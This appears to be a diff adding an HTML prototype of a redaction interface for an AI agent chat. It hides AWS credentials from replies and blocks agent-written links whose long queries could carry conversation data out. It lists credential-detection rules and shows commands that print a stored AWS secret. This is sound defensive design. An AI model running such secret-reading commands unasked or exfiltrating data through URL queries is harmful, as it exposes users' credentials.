+aws_secret_access_key<wbr> = <span class="v on" data-v="a"><button type="button" class="rc" data-pop="a0" aria-expanded="false" aria-controls="a0"><svg class="gi" aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg> credential <span class="q">· why?</span></button></span><span class="v" data-v="b"><button type="button" class="num" data-pop="a0" aria-expanded="false" aria-controls="a0" aria-label="Removed credential 1, details">1</button></span><span class="v" data-v="d"><button type="button" class="glyph" data-pop="a0" aria-expanded="false" aria-controls="a0" aria-label="Credential removed before saving, details"><svg class="gi" aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></button></span>
+
+[dev]
+aws_access_key_id<wbr> = AKIA…DEVKEY
+aws_secret_access_key<wbr> = <span class="v on" data-v="a"><button type="button" class="rc" data-pop="a1" aria-expanded="false" aria-controls="a1"><svg class="gi" aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg> credential</button></span><span class="v" data-v="b"><button type="button" class="num" data-pop="a1" aria-expanded="false" aria-controls="a1" aria-label="Removed credential 2, details">2</button></span><span class="v" data-v="d"><button type="button" class="glyph" data-pop="a1" aria-expanded="false" aria-controls="a1" aria-label="Credential removed before saving, details"><svg class="gi" aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></button></span>
+aws_session_token<wbr> = <span class="v on" data-v="a"><button type="button" class="rc" data-pop="a2" aria-expanded="false" aria-controls="a2"><svg class="gi" aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg> credential</button></span><span class="v" data-v="b"><button type="button" class="num" data-pop="a2" aria-expanded="false" aria-controls="a2" aria-label="Removed credential 3, details">3</button></span><span class="v" data-v="d"><button type="button" class="glyph" data-pop="a2" aria-expanded="false" aria-controls="a2" aria-label="Session token removed before saving, details"><svg class="gi" aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></button></span></pre></div>
+
+    <!-- protection education comes AFTER the content it refers to -->
+    <div class="v" data-v="d">
+      <div class="coach" role="region" aria-label="About redaction"><div><svg class="gi" aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div><div>
+        <div style="font-weight:600">3 values were removed before saving this reply</div>
+        <ol>
+          <li><b>Removed before saving.</b> No saved copy of this conversation contains these values.</li>
+          <li><b>Always on.</b> Nothing can show them, and there is no setting to change this.</li>
+          <li><b>Check the source.</b> The values usually remain there. Select a <svg class="gi" aria-hidden="true" style="width:12px;height:12px" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg> lock tag to find and view them.</li>
+        </ol>
+        <div style="font-size:12px;line-height:18px;color:var(--rx-muted);margin-top:6px">Keep secrets at their source. Your messages are saved exactly as you type them.</div>
+        <div style="display:flex;gap:8px;margin-top:10px;align-items:center;flex-wrap:wrap"><button type="button" class="btn pri" data-fb="Won't show again">Got it</button><button type="button" class="lnk" style="font-size:12px">Learn more</button></div>
+      </div></div>
+      <div style="font-size:11px;line-height:16px;color:var(--rx-muted);margin:4px 0 10px">Shown once after the first reply with removed values. Later replies show only the lock.</div>
+    </div>
+
+    <div class="v" data-v="b">
+      <div class="strip"><svg class="gi" aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg> <b>3 values removed before saving this reply</b><span class="pill">2 × access key</span><span class="pill">1 × session token</span><span style="flex:1"></span><button type="button" class="lnk" data-toggle="bdrawer" aria-expanded="false" aria-controls="bdrawer">Why were they removed? How can I view them? ▾</button></div>
+      <div id="bdrawer" class="drawer hidden" role="region" aria-label="Removed values">
+        <div class="src" style="margin-top:0"><b>These values are not in this conversation.</b> They were removed before saving. No saved copy of the conversation contains them. There is no "show" button. The values usually remain at their source on this machine.</div>
+        <div class="row first"><button type="button" class="num" data-pop="a0" aria-expanded="false" aria-controls="a0" aria-label="Details for value 1">1</button><div><div>Access key · <span class="pill">default</span></div><code style="font-size:11px;color:var(--rx-muted);background:transparent;border:0;padding:0">~/.aws/credentials [default]</code></div><div style="display:flex;gap:6px"><button type="button" class="btn pri" data-term="aws configure get aws_secret_access_key --profile default">Open in Terminal</button><button type="button" class="btn" data-fb="Copied">Copy path</button></div></div>
+        <div class="row"><button type="button" class="num" data-pop="a1" aria-expanded="false" aria-controls="a1" aria-label="Details for value 2">2</button><div><div>Access key · <span class="pill">dev</span></div><code style="font-size:11px;color:var(--rx-muted);background:transparent;border:0;padding:0">~/.aws/credentials [dev]</code></div><div style="display:flex;gap:6px"><button type="button" class="btn pri" data-term="aws configure get aws_secret_access_key --profile dev">Open in Terminal</button><button type="button" class="btn" data-fb="Copied">Copy path</button></div></div>
+        <div class="row"><button type="button" class="num" data-pop="a2" aria-expanded="false" aria-controls="a2" aria-label="Details for value 3">3</button><div><div>Session token · <span class="pill">dev</span></div><code style="font-size:11px;color:var(--rx-muted);background:transparent;border:0;padding:0">~/.aws/credentials [dev] · expires</code></div><div style="display:flex;gap:6px"><button type="button" class="btn pri" data-term="AWS_PROFILE=dev aws sts get-caller-identity">Use profile instead</button><button type="button" class="btn" data-fb="Copied">Copy path</button></div></div>
+        <div id="bterm" class="fbline hidden" role="status"><span></span><button type="button" class="lnk" data-clear="bterm">Clear</button></div>
+        <div class="foot"><button type="button" class="lnk" data-fb="Report sent — rule name only">Report a false positive</button><button type="button" class="lnk">About redaction</button></div>
+      </div>
+    </div>
+
+    <!-- ONE card template, three instances, each bound to its own source -->
+    <div id="a0" class="pop hidden" role="region" aria-labelledby="a0h" tabindex="-1">
+      <button type="button" class="x" data-close aria-label="Close">×</button>
+      <h4 id="a0h">A credential was removed here</h4>
+      <div class="src">It was removed <b>before saving</b>, so no copy of this conversation contains it and nothing here can show it. There is no setting for this.<br>Source: <code>~/.aws/credentials</code> section <code>[default]</code>.</div>
+      <div class="act"><div><div>View the value in the built-in Terminal <span class="note">· command added, not run · live output is not removed</span></div><code>aws configure get aws_secret_access_key --profile default</code></div><button type="button" class="btn pri" data-term-inline="a0">Open in Terminal</button></div>
+      <div id="a0-term" class="fbline hidden" role="status"><span>Command added to the Terminal panel — nothing was run.</span><button type="button" class="lnk" data-clear="a0-term">Clear</button></div>
+      <details class="disc"><summary>Technical details</summary><div class="body">Matched: 40 random-looking characters with no label — the shape of an AWS secret key. <span class="pill">rule: bare_aws_secret</span><br>Removed from this conversation and every copy of it — not from the source file.</div></details>
+      <details class="disc"><summary>More ways</summary><div class="body">
+        <div class="act"><div><div>Copy the file path</div><code>~/.aws/credentials</code></div><button type="button" class="btn" data-fb="Copied">Copy path</button></div>
+        <div class="act"><div><div>Ask the agent to save it in a private file <span class="note">· saves another secret copy on disk</span></div><code>Write the [default] secret to a file only my account can read (mode 0600). Do not print it. Reply with the path only.</code></div><button type="button" class="btn" data-fb="Added to composer — review before sending">Pre-fill request</button></div>
+      </div></details>
+      <div class="foot"><button type="button" class="lnk" data-fb="Report sent — rule name and session id only">Not a secret? Report a false positive</button><button type="button" class="lnk">About redaction</button></div>
+    </div>
+    <div id="a1" class="pop hidden" role="region" aria-labelledby="a1h" tabindex="-1">
+      <button type="button" class="x" data-close aria-label="Close">×</button>
+      <h4 id="a1h">A credential was removed here</h4>
+      <div class="src">It was removed <b>before saving</b>, so no copy of this conversation contains it and nothing here can show it. There is no setting for this.<br>Source: <code>~/.aws/credentials</code> section <code>[dev]</code>.</div>
+      <div class="act"><div><div>View the value in the built-in Terminal <span class="note">· command added, not run · live output is not removed</span></div><code>aws configure get aws_secret_access_key --profile dev</code></div><button type="button" class="btn pri" data-term-inline="a1">Open in Terminal</button></div>
+      <div id="a1-term" class="fbline hidden" role="status"><span>Command added to the Terminal panel — nothing was run.</span><button type="button" class="lnk" data-clear="a1-term">Clear</button></div>
+      <details class="disc"><summary>Technical details</summary><div class="body">Matched: 40 random-looking characters with no label — the shape of an AWS secret key. <span class="pill">rule: bare_aws_secret</span><br>Removed from this conversation and every copy of it — not from the source file.</div></details>
+      <details class="disc"><summary>More ways</summary><div class="body">
+        <div class="act"><div><div>Copy the file path</div><code>~/.aws/credentials</code></div><button type="button" class="btn" data-fb="Copied">Copy path</button></div>
+        <div class="act"><div><div>Ask the agent to save it in a private file <span class="note">· saves another secret copy on disk</span></div><code>Write the [dev] secret to a file only my account can read (mode 0600). Do not print it. Reply with the path only.</code></div><button type="button" class="btn" data-fb="Added to composer — review before sending">Pre-fill request</button></div>
+      </div></details>
+      <div class="foot"><button type="button" class="lnk" data-fb="Report sent — rule name and session id only">Not a secret? Report a false positive</button><button type="button" class="lnk">About redaction</button></div>
+    </div>
+    <div id="a2" class="pop hidden" role="region" aria-labelledby="a2h" tabindex="-1">
+      <button type="button" class="x" data-close aria-label="Close">×</button>
+      <h4 id="a2h">A session token was removed here</h4>
+      <div class="src">It was removed <b>before saving</b>, and it <b>expires within the hour</b> — you rarely need to see it.<br>Source: <code>~/.aws/credentials</code> section <code>[dev]</code>.</div>
+      <div class="act"><div><div>Use the profile. The CLI reads the token from its source.</div><code>AWS_PROFILE=dev aws sts get-caller-identity</code></div><button type="button" class="btn pri" data-term-inline="a2">Open in Terminal</button></div>
+      <div id="a2-term" class="fbline hidden" role="status"><span>Command added to the Terminal panel — nothing was run.</span><button type="button" class="lnk" data-clear="a2-term">Clear</button></div>
+      <details class="disc"><summary>Technical details</summary><div class="body">Matched: a session-token prefix (<code>FwoG…</code> / <code>IQoJ…</code>). <span class="pill">rule: aws_sts_token</span><br>If it already expired, the file holds a stale value — refresh your login instead.</div></details>
+      <details class="disc"><summary>More ways</summary><div class="body">
+        <div class="act"><div><div>View the token <span class="note">· command added, not run · live output is not removed</span></div><code>aws configure get aws_session_token --profile dev</code></div><button type="button" class="btn" data-term-inline="a2">Open in Terminal</button></div>
+        <div class="act"><div><div>Copy the file path</div><code>~/.aws/credentials</code></div><button type="button" class="btn" data-fb="Copied">Copy path</button></div>
+      </div></details>
+      <div class="foot"><button type="button" class="lnk" data-fb="Report sent — rule name and session id only">Not a secret? Report a false positive</button><button type="button" class="lnk">About redaction</button></div>
+    </div>
+
+    <p>The reviewers filter page:
+      <span class="blk" role="group" aria-label="Blocked link"><svg class="gi" aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 17H7A5 5 0 0 1 7 7"/><path d="M15 7h2a5 5 0 0 1 4 8"/><line x1="8" y1="12" x2="12" y2="12"/><line x1="2" y1="2" x2="22" y2="22"/></svg><span class="tagb">Blocked link</span><span class="host">reviews.corp.example/reviews</span><span class="q">⋯ query 290 chars</span><button type="button" class="ins" data-pop="u1" aria-expanded="false" aria-controls="u1">See link</button></span>
+    </p>
+    <div id="u1" class="pop hidden" role="region" aria-labelledby="u1h" tabindex="-1">
+      <button type="button" class="x" data-close aria-label="Close">×</button>
+      <div id="u1-main">
+        <h4 id="u1h">This link is blocked. It cannot open or preview.</h4>
+        <div class="src">Destination: <code>reviews.corp.example</code><br>Reason: the query has 290 characters. An agent-written long query can send conversation data to this destination.</div>
+        <details class="disc"><summary>Review full URL</summary><div class="body"><div class="cb" style="margin:6px 0"><pre class="prose" style="font-size:11px;line-height:16px">https://reviews.corp.example/reviews?<mark>filter=%7B%22status%22%3A%5B%22open%22%5D%2C%22owner%22%3A%22rayrayxu%22%2C%22range%22%3A%2230d%22%2C%22cols%22%3A%5B%22id%22%2C%22title%22%2C%22owner%22%5D%7D&amp;sort=-created&amp;view=table</mark></pre></div><span class="pill">rule: exfil_query_length · threshold 200</span></div></details>
+        <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:8px"><button type="button" class="btn" data-fb="Copied">Copy URL</button><button type="button" class="btn" data-confirm="u1-open">Open once</button><button type="button" class="btn warn" data-confirm="u1-allow">Allow for this host</button></div>
+        <div class="foot"><button type="button" class="lnk" data-fb="Report sent — rule name only">Not suspicious? Report a false positive</button><button type="button" class="lnk">About blocked links</button></div>
+      </div>
+      <div id="u1-open" class="confirm hidden" role="alertdialog" aria-label="Open once confirmation">
+        <b>Open reviews.corp.example one time?</b><br>The shown 290-character query will be sent to this host. No rule will change.
+        <div class="row2"><button type="button" class="btn pri" data-cancel="u1-open">Cancel</button><button type="button" class="btn" data-done="u1-open" data-fb-target="u1-fb" data-fb-text="Opened in a new tab — this link stays blocked here">Open</button></div>
+      </div>
+      <div id="u1-allow" class="confirm hidden" role="alertdialog" aria-label="Allow confirmation">
+        <b>Allow long queries on reviews.corp.example?</b><br>This applies to <b>this workspace only</b>. The dashboard saves this choice. An agent can never write it. Only length and base64 rules are relaxed. Credential rules stay active. Revoke it in Settings → Security → Redaction.
+        <div class="row2"><button type="button" class="btn pri" data-cancel="u1-allow">Cancel</button><button type="button" class="btn warn" data-done="u1-allow" data-fb-target="u1-fb" data-fb-text="Allowed for this workspace" data-undo="1">Allow</button></div>
+      </div>
+      <div id="u1-fb" class="fbline hidden" role="status"><span></span><button type="button" class="lnk hidden" data-undo-btn>Undo</button><button type="button" class="lnk hidden" data-settings-btn>Manage in Settings</button></div>
+    </div>
+
+    <p>To switch to dev and verify identity:</p>
+    <div class="cb"><div class="hd"><span class="mono">bash</span><button type="button" class="ab cpy" data-fb="Copied" aria-label="Copy code"><svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></button></div>
+<pre>AWS_PROFILE=dev aws sts get-caller-identity</pre></div>
+    <p style="margin:0">The CLI reads the profile itself; the key never needs to be in a shell variable.</p>
+    <div class="stats"><span class="mono">claude-fable-5.1 ·</span><span>0.42 credits ·</span><svg class="pi" aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:11px;height:11px;margin:0"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg><span>12s</span></div>
+    <div class="acts" role="toolbar" aria-label="Message actions"><span class="ts">11:24</span>
+      <button type="button" class="ab" aria-label="Copy message"><svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></button>
+      <button type="button" class="ab" aria-label="Copy link to message"><svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 17H7A5 5 0 0 1 7 7h2"/><path d="M15 7h2a5 5 0 1 1 0 10h-2"/><line x1="8" y1="12" x2="16" y2="12"/></svg></button>
+      <button type="button" class="ab" aria-label="Pin message"><svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="17" x2="12" y2="22"/><path d="M5 17h14v-1.76a2 2 0 0 0-1.11-1.79l-1.78-.9A2 2 0 0 1 15 10.76V6h1a2 2 0 0 0 0-4H8a2 2 0 0 0 0 4h1v4.76a2 2 0 0 1-1.11 1.79l-1.78.9A2 2 0 0 0 5 15.24Z"/></svg></button>
+      <button type="button" class="ab" aria-label="Fork from here"><svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="18" r="3"/><circle cx="6" cy="6" r="3"/><circle cx="18" cy="6" r="3"/><path d="M18 9v2c0 .6-.4 1-1 1H7c-.6 0-1-.4-1-1V9"/><path d="M12 12v3"/></svg></button>
+      <button type="button" class="ab" aria-label="Raw markdown"><svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg></button>
+      <button type="button" class="ab" aria-label="Regenerate"><svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8"/><path d="M21 3v5h-5"/><path d="M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16"/><path d="M8 16H3v5"/></svg></button>
+    </div>
+  </div>
+</div>
+</div>
+<p class="sub" style="margin-top:6px">On phones the cards open as bottom sheets; on desktop they open beside the message.</p>
+
+<div class="tbl wide"><table>
+<tr><th style="width:18%"></th><th>A Inline chip</th><th>B Shield strip + drawer</th><th>C First-run coach</th></tr>
+<tr><td>Where users learn why text was removed</td><td>In the details card after selecting the tag</td><td>In a short summary, with full details in the drawer</td><td>In the coach once, then in the details card</td></tr>
+<tr><td>Where users learn how to view the source</td><td>In the card's recommended action</td><td>Beside each item and in its details card</td><td>In the third coach step and the details card</td></tr>
+<tr><td>When one answer contains many credentials</td><td>Poor because the answer fills with tags</td><td><b>Best</b> because one summary groups them</td><td>Fair because the coach still needs separate markers</td></tr>
+<tr><td>What happens when users copy code</td><td>The tags are included in the selected text</td><td>The numbered markers are included in the selected text</td><td>The lock icons are included in the selected text</td></tr>
+<tr><td>Shows exactly where each removal happened</td><td><b>Best</b></td><td>Good because the summary keeps local markers</td><td>Good because each gap still has a marker</td></tr>
+<tr><td>How well it teaches new users</td><td>Fair</td><td>Fair</td><td><b>Best</b></td></tr>
+<tr><td>Amount of implementation work</td><td>Smallest</td><td>Medium</td><td>Medium</td></tr>
+</table></div>
+<div class="callout"><b>Recommendation: C → A → B.</b> Start with C once, after the first answer that contains removed values, so a new user learns what happened. After that, use A when one value was removed and let its neutral lock open the details card. Use B when one answer contains several removed values, while keeping a small marker at each exact location. Every version places a marker inside copied code blocks (<code>&lt;pre&gt;</code>), and copying should turn each marker into <code>&lt;REDACTED&gt;</code>. Use the same blocked-link chip in every version. Keep the existing placeholder tag and store that value's rule and source in its metadata. Only the session owner sees actions; Slack and other shared pages show explanatory text without actions.</div>
+
+<h2 id="keep">What does not change</h2>
+<ul>
+  <li><b>Never paste secrets into chat.</b> Messages written by the user are saved exactly as typed and remain with the conversation, so the coach ends with this warning.</li>
+  <li>Secrets found in agent replies are <b>never saved</b> in the conversation, which means there cannot be a "show original" button.</li>
+  <li>Known credential formats such as AKIA, PEM, <code>xoxb-</code>, and <code>ghp_</code> remain hidden everywhere, including inside links. Remove only the credential from a URL rather than deleting the whole URL, and never let the "Allow" list weaken credential rules.</li>
+  <li>Logs, audits, and backups continue to use full redaction, and they do not receive any tools for viewing the source.</li>
+</ul>
+
+<h2 id="rollout">Rollout</h2>
+<ol>
+  <li>Add the three display rules first, because they stop web requests that would otherwise happen without a click.</li>
+  <li>Store each match's rule name and source with its placeholder, then add the neutral lock tag, details card, action confirmations, and one-time coach after the answer. Remove the old grey notice line — the markers replace it.</li>
+  <li>Replace deleted URLs with a Blocked link chip and a See link control. Let only the session owner use <em>Open once</em>, with Cancel selected by default, or create a per-workspace <em>Allow</em> rule with confirmation and Undo. Only the dashboard can write this list, while Settings → Security → Redaction shows each entry and lets the user revoke it.</li>
+  <li>Release the phone layout with the main card, including touch targets that are at least 44×44 points.</li>
+  <li>Decode percent-encoded text before checking it, then extend the internal list of exact hosts that can bypass only the long-query and base64 checks.</li>
+  <li>Add a read-only Redaction section under Settings → Security that shows groups of rules, recent match counts, and allowed hosts, while clearly stating that redaction cannot be turned off.</li>
+</ol>
+<p>Each step is independent, so it can be released or rolled back without requiring the later steps.</p>
+<div class="grid2">
+  <div class="callout"><b>How we know it worked</b><ul style="margin:6px 0 0"><li>For two weeks, count false-positive reports by rule name without collecting the removed value, then use those counts to find rules that need changes.</li><li>Check whether #kiro-crew-debug receives fewer questions about missing links and missing secrets.</li><li>Measure how quickly users dismiss the coach with "Got it", because very fast dismissal may mean the card is too long to read.</li></ul></div>
+  <div class="callout"><b>Open questions</b><ul style="margin:6px 0 0"><li>When users copy text, should every marker become the same fixed token, or should the copied text keep the visible marker?</li><li>On shared pages, should we hide the entire suspicious query value? The preferred answer is yes; the other option hides only the part that matched the rule.</li><li>If a host appears in both places, should the workspace Allow list or the built-in exact-host exemption take priority (<code>exempt_exact_hosts</code>)?</li></ul></div>
+</div>
+
+<h2 id="open">A live example</h2>
+<p>While this prototype was being written, the redaction check saw an AWS key label followed by an equals sign and an HTML tag. The chat said, "4 credentials in this message were replaced," even though the value after the equals sign was <code>&lt;span&gt;</code>, not a secret. Because the label alone caused this incorrect match, <em>Report a false positive</em> must always be available.</p>
+
+</div>
+<script>
+(function(){
+  var root=document.getElementById('rx');
+  var seg=document.getElementById('seg');
+  var backdrop=document.getElementById('backdrop');
+  var lastTrigger=null;
+  function closeAll(){
+    root.querySelectorAll('.pop').forEach(function(p){p.classList.add('hidden')});
+    root.querySelectorAll('[data-pop]').forEach(function(b){b.setAttribute('aria-expanded','false')});
+    root.querySelectorAll('.confirm').forEach(function(c){c.classList.add('hidden')});
+    document.body.classList.remove('pop-open');
+  }
+  function show(v){
+    seg.querySelectorAll('button').forEach(function(b){b.setAttribute('aria-pressed',String(b.dataset.v===v))});
+    root.querySelectorAll('.v').forEach(function(el){el.classList.toggle('on',el.dataset.v===v)});
+    closeAll();
+  }
+  seg.querySelectorAll('button').forEach(function(b){b.addEventListener('click',function(){show(b.dataset.v)})});
+  root.querySelectorAll('[data-pop]').forEach(function(b){b.addEventListener('click',function(e){
+    e.stopPropagation();
+    var p=document.getElementById(b.dataset.pop); if(!p) return;
+    var open=p.classList.contains('hidden');
+    closeAll();
+    if(open){ p.classList.remove('hidden'); b.setAttribute('aria-expanded','true'); lastTrigger=b; document.body.classList.add('pop-open'); p.focus({preventScroll:window.innerWidth<=640}); }
+  })});
+  function dismiss(){ closeAll(); if(lastTrigger){lastTrigger.focus(); lastTrigger=null;} }
+  root.querySelectorAll('[data-close]').forEach(function(x){x.addEventListener('click',dismiss)});
+  backdrop.addEventListener('click',dismiss);
+  document.addEventListener('keydown',function(e){ if(e.key==='Escape') dismiss(); });
+  root.querySelectorAll('[data-toggle]').forEach(function(b){b.addEventListener('click',function(){
+    var p=document.getElementById(b.dataset.toggle); if(!p) return;
+    var hidden=p.classList.toggle('hidden'); b.setAttribute('aria-expanded',String(!hidden));
+  })});
+  root.querySelectorAll('.trow').forEach(function(b){b.addEventListener('click',function(){
+    var p=document.getElementById(b.getAttribute('aria-controls')); if(!p) return;
+    var hidden=p.classList.toggle('hidden'); b.setAttribute('aria-expanded',String(!hidden));
+  })});
+  /* feedback: transient label swap */
+  root.querySelectorAll('[data-fb]').forEach(function(b){b.addEventListener('click',function(){
+    if(b.dataset.busy) return; b.dataset.busy='1';
+    var old=b.innerHTML; b.innerHTML=b.dataset.fb; b.disabled=true;
+    setTimeout(function(){ b.innerHTML=old; b.disabled=false; delete b.dataset.busy; },1600);
+  })});
+  /* terminal pre-fill: persistent "added, not run" line with Clear */
+  function showTerm(lineId,msg){
+    var l=document.getElementById(lineId); if(!l) return;
+    l.querySelector('span').textContent=msg||'Command added to the Terminal panel — nothing was run.';
+    l.classList.remove('hidden');
+  }
+  root.querySelectorAll('[data-term-inline]').forEach(function(b){b.addEventListener('click',function(){
+    showTerm(b.dataset.termInline+'-term');
+  })});
+  root.querySelectorAll('[data-term]').forEach(function(b){b.addEventListener('click',function(){
+    showTerm('bterm','Command added to the Terminal panel — nothing was run: '+b.dataset.term);
+  })});
+  root.querySelectorAll('[data-clear]').forEach(function(b){b.addEventListener('click',function(){
+    document.getElementById(b.dataset.clear).classList.add('hidden');
+  })});
+  /* confirmations: Cancel is the default (pri) action */
+  root.querySelectorAll('[data-confirm]').forEach(function(b){b.addEventListener('click',function(){
+    root.querySelectorAll('.confirm').forEach(function(c){c.classList.add('hidden')});
+    var c=document.getElementById(b.dataset.confirm); if(!c) return;
+    c.classList.remove('hidden'); var cancel=c.querySelector('[data-cancel]'); if(cancel) cancel.focus();
+  })});
+  root.querySelectorAll('[data-cancel]').forEach(function(b){b.addEventListener('click',function(){
+    document.getElementById(b.dataset.cancel).classList.add('hidden');
+  })});
+  root.querySelectorAll('[data-done]').forEach(function(b){b.addEventListener('click',function(){
+    document.getElementById(b.dataset.done).classList.add('hidden');
+    var fb=document.getElementById(b.dataset.fbTarget); if(!fb) return;
+    fb.querySelector('span').textContent=b.dataset.fbText;
+    var undo=fb.querySelector('[data-undo-btn]'), st=fb.querySelector('[data-settings-btn]');
+    if(b.dataset.undo){ undo.classList.remove('hidden'); st.classList.remove('hidden'); } else { undo.classList.add('hidden'); st.classList.add('hidden'); }
+    fb.classList.remove('hidden');
+  })});
+  root.querySelectorAll('[data-undo-btn]').forEach(function(b){b.addEventListener('click',function(){
+    var fb=b.closest('.fbline'); fb.querySelector('span').textContent='Removed — the host is no longer allowed.';
+    b.classList.add('hidden'); fb.querySelector('[data-settings-btn]').classList.add('hidden');
+    setTimeout(function(){ fb.classList.add('hidden'); },1600);
+  })});
+})();
+</script>
+</body>
+</html>
